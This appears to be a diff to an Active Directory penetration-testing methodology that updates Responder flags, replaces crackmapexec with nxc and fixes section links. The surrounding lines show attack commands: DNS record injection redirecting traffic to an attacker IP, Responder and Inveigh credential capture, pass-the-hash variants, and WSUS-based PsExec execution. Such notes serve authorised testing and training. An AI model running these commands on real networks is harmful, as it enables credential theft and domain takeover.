@@ -404,7 +404,7 @@ net user <USER> <NEW_PASSWORD> /domain
 
 ```bash
 # From Linux — Start Responder
-sudo responder -I tun0 -rdw
+sudo responder -I tun0 -wv
 
 # From Windows — Inveigh (Responder equivalent for Windows footholds)
 # https://github.com/Kevin-Robertson/Inveigh
@@ -470,7 +470,7 @@ python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r '*' --action add --da
 python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r '<TARGET_HOSTNAME>' --action add --data <ATTACKER_IP> <DC_IP>
 
 # Combine with Responder or Inveigh to capture credentials from redirected traffic
-sudo responder -I tun0 -rdw
+sudo responder -I tun0 -wv
 # Or from Windows foothold:
 .\Inveigh.exe
 
@@ -1242,7 +1242,7 @@ certipy-ad cert -pfx <TARGET_USER>.pfx -nocert -out <TARGET_USER>.key
 ```bash
 # Enumerate the WinRM listener's cert-mapping config remotely to confirm
 # Certificate auth is enabled before burning the cert.
-crackmapexec winrm <TARGET> -u '<USER>' -p '<PASSWORD>' \
+nxc winrm <TARGET> -u '<USER>' -p '<PASSWORD>' \
     -x 'winrm get winrm/config/service/auth'
 
 # Look for: Certificate = true
@@ -4090,7 +4090,7 @@ python3 pywsus.py -H <WSUS_SERVER_IP> -p 8530 -e PsExec64.exe -c '/accepteula -s
 
 > **Automate it:** `python3 automation/recon.py <DC_IP> --mode creds --user <U> --domain <DOM> [--password <P> | --hash <NT> | --kerberos]` runs the whole sweep below (admin-check, /24 reuse, shares+spider, kerberoast, asrep, descriptions, gmsa/laps, certipy, bloodhound) into `creds_<ip>_<ts>/`. Manual steps:
 >
-> **Auth variant?** swap `-p '<PASS>'` for `-H <NT_HASH>` (PtH) or `-k --use-kcache` + `export KRB5CCNAME=<ccache>` (Kerberos). Impacket uses `-hashes :<NT>` / `-k -no-pass`. All failing with good creds → check `klist` principal/realm case + NTLM-disabled [§1.0.5](#105-ntlm-disabled-dc--detect--pivot-to-kerberos-only).
+> **Auth variant?** swap `-p '<PASS>'` for `-H <NT_HASH>` (PtH) or `-k --use-kcache` + `export KRB5CCNAME=<ccache>` (Kerberos). Impacket uses `-hashes :<NT>` / `-k -no-pass`. All failing with good creds → check `klist` principal/realm case + NTLM-disabled [§1.0.5](#105-ntlm-disabled-dc-detect-pivot-to-kerberos-only).
 
 ```text
 Got domain credentials? Follow this order:
@@ -4136,7 +4136,7 @@ Got domain credentials? Follow this order:
 
 ## Quick Reference: BloodHound Edge → Action
 
-> **Canonical Edge → Action map:** [bloodhound-guide.md §Step 6](bloodhound-guide.md#step-6-edge--action-quick-map). The table below extends the canonical map with AD-specific entries (GPO-targeted edges, `MemberOf` group abuses, `HasSIDHistory`) that pair with this methodology's phase numbering.
+> **Canonical Edge → Action map:** [bloodhound-guide.md §Step 6](bloodhound-guide.md#step-6-edge-action-quick-map). The table below extends the canonical map with AD-specific entries (GPO-targeted edges, `MemberOf` group abuses, `HasSIDHistory`) that pair with this methodology's phase numbering.
 
 ```text
 BloodHound shows an edge from your owned principal? Do this:
